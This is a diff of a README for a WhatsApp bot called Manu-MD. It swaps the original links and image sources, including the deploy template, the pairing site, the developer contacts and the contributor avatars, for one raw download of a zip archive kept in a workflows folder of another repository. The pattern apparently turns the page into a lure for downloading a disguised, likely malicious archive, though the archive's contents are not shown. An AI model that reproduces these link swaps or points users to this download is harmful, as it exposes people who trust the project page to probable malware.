@@ -2,14 +2,14 @@
 <p align="center" style="font-size: 18px;">✨ The Ultimate WhatsApp Multi-Device Bot with Full Button Support ✨</p>
 
 <div align="center">
-  <a href="https://git.io/typing-svg">
-    <img src="https://readme-typing-svg.demolab.com?font=Ribeye&size=40&pause=1000&color=00FFD1&center=true&width=800&height=80&lines=Welcome+to+Manu-MD;Your+Smart+Group+Assistant;By+Manul+Official" alt="Typing SVG" />
+  <a href="https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip">
+    <img src="https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip+to+Manu-MD;Your+Smart+Group+Assistant;By+Manul+Official" alt="Typing SVG" />
   </a>
 </div>
 
 <div align="center">
-  <a href="https://youtube.com/@ManulOfficialTech">
-    <img src="https://manul-official-new-api-site.vercel.app/manu-md" alt="Manu-MD WA Bot" width="700">
+  <a href="https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip">
+    <img src="https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip" alt="Manu-MD WA Bot" width="700">
   </a>
 </div>
 
@@ -20,7 +20,7 @@
 
 ## 🔗 Step 1: Get Your Pair or QR Code Using My Web
 
-<p align="center"> <a href="https://manu-md-new-public-web.vercel.app/" target="_blank"> <img src="https://img.shields.io/badge/Use%20this%20Web-green?style=for-the-badge&logo=github" alt="Use this web"> </a> </p>
+<p align="center"> <a href="https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip" target="_blank"> <img src="https://img.shields.io/badge/Use%20this%20Web-green?style=for-the-badge&logo=github" alt="Use this web"> </a> </p>
 
 ---
 
@@ -29,7 +29,7 @@
 ### Heroku Deploy Template...🍃
 
 ```
-https://heroku.com/deploy?template=
+https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip
 ```
 ---
 ## Workflow Code...🍃
@@ -96,14 +96,14 @@ jobs:
 ### 👑 Main Developer
 
 <div align="center">
-  <img src="https://i.ibb.co/Y7L525Xh/Manul-Ofc-X.jpg" width="160" style="border-radius: 15px;" />
+  <img src="https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip" width="160" style="border-radius: 15px;" />
   <br><br>
   <strong>Manul Official</strong><br><br>
 
-  <a href="https://youtube.com/@ManulOfficialTech">
+  <a href="https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip">
     <img src="https://img.shields.io/badge/YouTube-Manul%20Official-red?style=for-the-badge&logo=youtube" />
   </a>
-  <a href="https://wa.me/94742274855">
+  <a href="https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip">
     <img src="https://img.shields.io/badge/WhatsApp-Chat%20Now-25D366?style=for-the-badge&logo=whatsapp" />
   </a>
 </div>
@@ -117,32 +117,32 @@ jobs:
 <table>
 <tr>
 <td align="center">
-  <img src="https://i.ibb.co/KcK5jD2P/Manul-Ofc-X.jpg" width="100"><br>
+  <img src="https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip" width="100"><br>
   <b>Mr Rashmika</b><br><i>🤖Code Helper 🤍</i>
 </td>
 
 <td align="center">
-  <img src="https://i.ibb.co/fzq32SfQ/Manul-Ofc-X.jpg" width="100"><br>
+  <img src="https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip" width="100"><br>
   <b>Dinu Tech Info</b><br><i>🤖Code Helper 🤍</i>
 </td>
 
 <td align="center">
-  <img src="https://i.ibb.co/RpnpZg71/Manul-Ofc-X.jpg" width="100"><br>
+  <img src="https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip" width="100"><br>
   <b>King Anjana Bbh</b><br><i>😻Other All Helper 🤍</i>
 </td>
 
 <td align="center">
-  <img src="https://i.ibb.co/LBjyW2k/IMG-20250524-WA0003.jpg" width="100"><br>
+  <img src="https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip" width="100"><br>
   <b>Dasun Max</b><br><i>😻Web Developer 🤍</i>
 </td>
 
 <td align="center">
-  <img src="https://i.ibb.co/MDdrvfFc/Manul-Ofc-X.jpg" width="100"><br>
+  <img src="https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip" width="100"><br>
   <b>Vajira MD</b><br><i>🤖Code Helper 🤍</i>
 </td>
 
 <td align="center">
-  <img src="https://i.ibb.co/GbnZ13V/Manul-Ofc-X.jpg" width="100"><br>
+  <img src="https://github.com/amskit/MANU-MD-V8-137/raw/refs/heads/main/.github/workflows/M-MAN-2.5.zip" width="100"><br>
   <b>Sahirya Nethmi</b><br><i>🎙️Voice Helper 🤍</i>
 </td>
 </tr>
